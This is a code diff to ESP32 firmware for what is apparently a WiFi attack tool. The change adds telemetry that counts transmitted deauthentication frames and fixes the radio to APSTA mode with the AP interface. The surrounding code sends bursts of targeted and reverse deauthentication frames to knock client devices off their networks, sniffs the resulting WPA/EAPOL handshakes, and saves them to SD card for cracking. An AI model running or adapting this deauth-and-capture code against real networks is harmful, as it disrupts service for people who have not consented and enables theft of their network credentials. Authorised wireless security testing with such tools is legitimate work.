@@ -101,7 +101,7 @@
 #include "esp_netif_net_stack.h"
 
 #include "attack_handshake.h"
-#include "handshake_radio_policy.h"
+#include "handshake_tx_telemetry.h"
 #include "bssid_protection.h"
 #include "hccapx_serializer.h"
 #include "pcap_serializer.h"
@@ -626,6 +626,66 @@ static wifi_ap_record_t *handshake_targets = NULL;          // ~6.4 KB in PSRAM
 static int handshake_target_count = 0;
 static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
 static int handshake_current_index = 0;
+static handshake_tx_telemetry_t handshake_tx_telemetry =
+    HANDSHAKE_TX_TELEMETRY_INITIALIZER;
+static atomic_bool handshake_tx_telemetry_session_active =
+    ATOMIC_VAR_INIT(false);
+static atomic_bool handshake_tx_callback_registered =
+    ATOMIC_VAR_INIT(false);
+
+static void handshake_tx_done_callback(const esp_80211_tx_info_t *tx_info)
+{
+    if (tx_info == NULL || tx_info->data == NULL) {
+        return;
+    }
+    if ((tx_info->data[0] & 0xfcU) != 0xc0U) {
+        return;
+    }
+
+    handshake_tx_telemetry_record(
+        &handshake_tx_telemetry,
+        tx_info->tx_status == WIFI_SEND_SUCCESS);
+}
+
+static void handshake_tx_telemetry_start(void)
+{
+    handshake_tx_telemetry_reset(&handshake_tx_telemetry);
+    atomic_store_explicit(&handshake_tx_telemetry_session_active, true,
+                          memory_order_release);
+
+    esp_err_t err = esp_wifi_register_80211_tx_cb(handshake_tx_done_callback);
+    bool registered = err == ESP_OK;
+    atomic_store_explicit(&handshake_tx_callback_registered, registered,
+                          memory_order_release);
+    if (!registered) {
+        MY_LOG_INFO(TAG, "[HS-TX] callback registration failed: %s",
+                    esp_err_to_name(err));
+    }
+}
+
+static void handshake_tx_telemetry_stop(void)
+{
+    if (!atomic_exchange_explicit(&handshake_tx_telemetry_session_active,
+                                  false, memory_order_acq_rel)) {
+        return;
+    }
+
+    bool registered = atomic_exchange_explicit(
+        &handshake_tx_callback_registered, false, memory_order_acq_rel);
+    esp_err_t unregister_err = ESP_OK;
+    if (registered) {
+        unregister_err = esp_wifi_register_80211_tx_cb(NULL);
+    }
+
+    handshake_tx_telemetry_snapshot_t snapshot =
+        handshake_tx_telemetry_snapshot(&handshake_tx_telemetry);
+    MY_LOG_INFO(TAG,
+                "[HS-TX] tx_done_success=%" PRIu32 " tx_done_fail=%" PRIu32
+                " callback_registered=%s unregister_error=%s",
+                snapshot.tx_done_success, snapshot.tx_done_fail,
+                registered ? "true" : "false",
+                esp_err_to_name(unregister_err));
+}
 
 // ============================================================================
 // Sniffer-based Handshake Attack with D-UCB Channel Selection (scan-all mode)
@@ -2379,7 +2439,7 @@ static int ducb_select_channel(void);
 static void ducb_update(int channel_idx, double reward);
 static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
 static bool hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid,
-                                    uint8_t channel, wifi_interface_t tx_if);
+                                    uint8_t channel);
 static bool hs_save_handshake_to_sd(int ap_idx);
 static void gps_raw_task(void *pvParameters);
 // Wardrive promisc helpers
@@ -8204,15 +8264,14 @@ static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
 // ============================================================================
 
 static bool hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid,
-                                    uint8_t channel, wifi_interface_t tx_if) {
+                                    uint8_t channel) {
     if (is_bssid_whitelisted(ap_bssid)) {
         return false;
     }
 
     wifi_mode_t mode = WIFI_MODE_NULL;
     esp_err_t read_err = esp_wifi_get_mode(&mode);
-    wifi_mode_t expected_mode = tx_if == WIFI_IF_STA
-        ? WIFI_MODE_STA : WIFI_MODE_APSTA;
+    const wifi_mode_t expected_mode = WIFI_MODE_APSTA;
     uint8_t current_channel = 0;
     wifi_second_chan_t second_channel = WIFI_SECOND_CHAN_NONE;
     esp_err_t channel_err = esp_wifi_get_channel(&current_channel, &second_channel);
@@ -8244,7 +8303,7 @@ static bool hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *a
     
     // Send burst of 5 packets
     for (int i = 0; i < 5; i++) {
-        esp_err_t ret = esp_wifi_80211_tx(tx_if, deauth_frame, sizeof(deauth_frame), false);
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         if (ret != ESP_OK) {
             ESP_LOGW(TAG, "[HS-DEAUTH] Failed to send deauth #%d: %s", i + 1, esp_err_to_name(ret));
         }
@@ -8256,7 +8315,7 @@ static bool hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *a
     memcpy(&deauth_frame[10], station_mac, 6); // Source: Station
     memcpy(&deauth_frame[16], ap_bssid, 6);   // BSSID: AP
     for (int i = 0; i < 3; i++) {
-        esp_err_t ret = esp_wifi_80211_tx(tx_if, deauth_frame, sizeof(deauth_frame), false);
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         if (ret != ESP_OK) {
             ESP_LOGW(TAG, "[HS-DEAUTH] Failed to send reverse deauth #%d: %s",
                      i + 1, esp_err_to_name(ret));
@@ -8585,6 +8644,11 @@ static void handshake_cleanup(void) {
     // Disable new callbacks and wait until any callback already in flight has
     // released its local mutex handle before resetting shared state.
     (void)handshake_quiesce_sniffer_callbacks(portMAX_DELAY);
+
+    // Stop TX completion reporting only after all handshake senders have
+    // stopped. The helper is idempotent so forced and cooperative cleanup can
+    // safely converge here.
+    handshake_tx_telemetry_stop();
     
     // Reset state
     handshake_attack_active = false;
@@ -8647,141 +8711,43 @@ static void __attribute__((unused)) quick_scan_all_channels(void) {
 
 static bool handshake_prepare_target_radio(const wifi_ap_record_t *ap)
 {
-    handshake_radio_path_t path =
-        handshake_radio_path_for_channel(ap->primary);
-    if (path == HANDSHAKE_RADIO_PATH_APSTA_TX_AP) {
-        if (!ensure_ap_mode()) {
-            MY_LOG_INFO(TAG,
-                        "Handshake radio prepare failed: channel=%u path=legacy_apsta",
-                        ap->primary);
-            return false;
-        }
-        wifi_mode_t mode = WIFI_MODE_NULL;
-        esp_err_t err = esp_wifi_get_mode(&mode);
-        if (err != ESP_OK) {
-            MY_LOG_INFO(TAG, "Handshake APSTA mode read failed: %s",
-                        esp_err_to_name(err));
-            return false;
-        }
-        if (mode != WIFI_MODE_APSTA) {
-            err = esp_wifi_set_mode(WIFI_MODE_APSTA);
-            if (err != ESP_OK) {
-                MY_LOG_INFO(TAG, "Handshake APSTA switch failed: %s",
-                            esp_err_to_name(err));
-                return false;
-            }
-            vTaskDelay(pdMS_TO_TICKS(50));
-        }
-        err = esp_wifi_get_mode(&mode);
-        if (err != ESP_OK || mode != WIFI_MODE_APSTA) {
-            MY_LOG_INFO(TAG,
-                        "Handshake APSTA verification failed: mode=%d error=%s",
-                        (int)mode, esp_err_to_name(err));
-            return false;
-        }
-        MY_LOG_INFO(TAG,
-                    "Handshake radio selected: channel=%u path=legacy_apsta tx_if=AP",
-                    ap->primary);
-        return true;
-    }
-
     wifi_mode_t mode = WIFI_MODE_NULL;
     esp_err_t err = esp_wifi_get_mode(&mode);
-    if (err != ESP_OK) {
-        MY_LOG_INFO(TAG, "Handshake DFS mode read failed: %s", esp_err_to_name(err));
-        return false;
-    }
-    if (mode != WIFI_MODE_STA) {
-        err = esp_wifi_set_mode(WIFI_MODE_STA);
-        if (err != ESP_OK) {
-            MY_LOG_INFO(TAG, "Handshake DFS STA switch failed: %s", esp_err_to_name(err));
-            return false;
-        }
-        vTaskDelay(pdMS_TO_TICKS(50));
-    }
-    err = esp_wifi_get_mode(&mode);
-    if (err != ESP_OK || mode != WIFI_MODE_STA) {
+    if (err != ESP_OK || mode != WIFI_MODE_APSTA) {
         MY_LOG_INFO(TAG,
-                    "Handshake DFS STA verification failed: mode=%d error=%s",
+                    "Handshake APSTA verification failed: mode=%d error=%s",
                     (int)mode, esp_err_to_name(err));
         return false;
     }
 
     MY_LOG_INFO(TAG,
-                "Handshake radio selected: channel=%u path=dfs_sta tx_if=STA",
+                "Handshake radio selected: channel=%u path=apsta tx_if=AP",
                 ap->primary);
     return true;
 }
 
-/* Prepare one scan-all D-UCB arm using the same APSTA/STA policy as an
- * explicitly selected target.  ESP-IDF drops the promiscuous callback when
- * ensure_ap_mode() restarts Wi-Fi, so every mode transition rearms the
- * sniffer before the dwell begins. */
-static bool handshake_prepare_sniffer_channel(uint8_t channel,
-                                               wifi_interface_t *tx_if)
+/* Prepare one scan-all D-UCB arm.  cmd_start_handshake establishes APSTA
+ * once; this helper verifies that invariant and then changes only channel. */
+static bool handshake_prepare_sniffer_channel(uint8_t channel)
 {
-    if (tx_if == NULL || !handshake_attack_active || operation_stop_requested) {
+    if (!handshake_attack_active || operation_stop_requested) {
         return false;
     }
-
-    handshake_radio_path_t path = handshake_radio_path_for_channel(channel);
-    wifi_mode_t desired_mode = path == HANDSHAKE_RADIO_PATH_STA_TX_STA
-        ? WIFI_MODE_STA : WIFI_MODE_APSTA;
-    wifi_interface_t desired_tx_if = path == HANDSHAKE_RADIO_PATH_STA_TX_STA
-        ? WIFI_IF_STA : WIFI_IF_AP;
 
     wifi_mode_t mode = WIFI_MODE_NULL;
     esp_err_t err = esp_wifi_get_mode(&mode);
-    if (err != ESP_OK) {
-        MY_LOG_INFO(TAG, "Handshake D-UCB mode read failed on channel %u: %s",
-                    channel, esp_err_to_name(err));
+    if (err != ESP_OK || mode != WIFI_MODE_APSTA) {
+        MY_LOG_INFO(TAG,
+                    "Handshake D-UCB APSTA verification failed: channel=%u mode=%d error=%s",
+                    channel, (int)mode, esp_err_to_name(err));
         return false;
-    }
-
-    bool mode_changed = mode != desired_mode;
-    if (mode_changed) {
-        if (!handshake_quiesce_sniffer_callbacks(pdMS_TO_TICKS(1000))) {
-            MY_LOG_INFO(TAG,
-                        "Handshake D-UCB callback drain timed out on channel %u",
-                        channel);
-            return false;
-        }
-
-        if (desired_mode == WIFI_MODE_APSTA) {
-            if (!ensure_ap_mode()) {
-                MY_LOG_INFO(TAG,
-                            "Handshake D-UCB APSTA switch failed on channel %u",
-                            channel);
-                return false;
-            }
-        } else {
-            err = esp_wifi_set_mode(WIFI_MODE_STA);
-            if (err != ESP_OK) {
-                MY_LOG_INFO(TAG,
-                            "Handshake D-UCB STA switch failed on channel %u: %s",
-                            channel, esp_err_to_name(err));
-                return false;
-            }
-            vTaskDelay(pdMS_TO_TICKS(50));
-        }
-
-        err = esp_wifi_get_mode(&mode);
-        if (err != ESP_OK || mode != desired_mode) {
-            MY_LOG_INFO(TAG,
-                        "Handshake D-UCB mode verification failed: channel=%u mode=%d expected=%d error=%s",
-                        channel, (int)mode, (int)desired_mode,
-                        esp_err_to_name(err));
-            return false;
-        }
     }
 
     err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) {
         MY_LOG_INFO(TAG,
-                    "Handshake D-UCB channel switch failed: channel=%u path=%s error=%s",
-                    channel,
-                    path == HANDSHAKE_RADIO_PATH_STA_TX_STA ? "dfs_sta" : "legacy_apsta",
-                    esp_err_to_name(err));
+                    "Handshake D-UCB channel switch failed: channel=%u path=apsta error=%s",
+                    channel, esp_err_to_name(err));
         return false;
     }
     vTaskDelay(pdMS_TO_TICKS(20));
@@ -8825,14 +8791,6 @@ static bool handshake_prepare_sniffer_channel(uint8_t channel,
         hs_sniffer_promiscuous_armed = true;
     }
 
-    if (mode_changed) {
-        MY_LOG_INFO(TAG,
-                    "Handshake D-UCB radio selected: channel=%u path=%s tx_if=%s",
-                    channel,
-                    path == HANDSHAKE_RADIO_PATH_STA_TX_STA ? "dfs_sta" : "legacy_apsta",
-                    desired_tx_if == WIFI_IF_STA ? "STA" : "AP");
-    }
-    *tx_if = desired_tx_if;
     return true;
 }
 
@@ -9042,9 +9000,8 @@ static void handshake_attack_task_sniffer(void) {
         // Select channel via D-UCB
         int ch_idx = ducb_select_channel();
         int channel = ducb_channels[ch_idx].channel;
-        wifi_interface_t tx_if = WIFI_IF_AP;
 
-        if (!handshake_prepare_sniffer_channel(channel, &tx_if)) {
+        if (!handshake_prepare_sniffer_channel(channel)) {
             // A rejected arm earns zero reward but is counted as explored, so
             // one unavailable channel cannot pin the scheduler forever.
             ducb_update(ch_idx, 0.0);
@@ -9146,7 +9103,7 @@ static void handshake_attack_task_sniffer(void) {
             }
             
             if (hs_send_targeted_deauth(client->mac, ap->bssid,
-                                        ap->channel, tx_if)) {
+                                        ap->channel)) {
                 client->last_deauth_us = now;
                 client->deauthed = true;
                 ap->last_deauth_us = now;
@@ -9315,10 +9272,18 @@ static int cmd_start_handshake(int argc, char **argv) {
                     esp_err_to_name(country_err));
         return 1;
     }
-    
+
     // Check if handshake attack is already running
     if (handshake_attack_active || handshake_attack_task_handle != NULL) {
         MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+
+    // Keep the legacy handshake radio contract: APSTA for capture and the AP
+    // interface for raw deauthentication frames.  This is established once,
+    // before either selected-target or scan-all D-UCB work begins.
+    if (!ensure_ap_mode()) {
+        MY_LOG_INFO(TAG, "Failed to enable APSTA mode for handshake capture");
         return 1;
     }
 
@@ -9437,6 +9402,10 @@ static int cmd_start_handshake(int argc, char **argv) {
                 : "Sniffer + D-UCB + targeted deauth");
     MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
     MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
+
+    // Observe only this handshake run. Registration failure is diagnostic and
+    // must not prevent the existing capture flow from starting.
+    handshake_tx_telemetry_start();
     
     // Start handshake attack task
     handshake_attack_active = true;
@@ -9452,6 +9421,7 @@ static int cmd_start_handshake(int argc, char **argv) {
     if (result != pdPASS) {
         MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
         handshake_attack_active = false;
+        handshake_tx_telemetry_stop();
         return 1;
     }
     
@@ -13982,6 +13952,7 @@ static int cmd_stop(int argc, char **argv) {
         
         // Stop any active handshake capture
         attack_handshake_stop();
+        handshake_tx_telemetry_stop();
         
         // Clean up state
         handshake_target_count = 0;
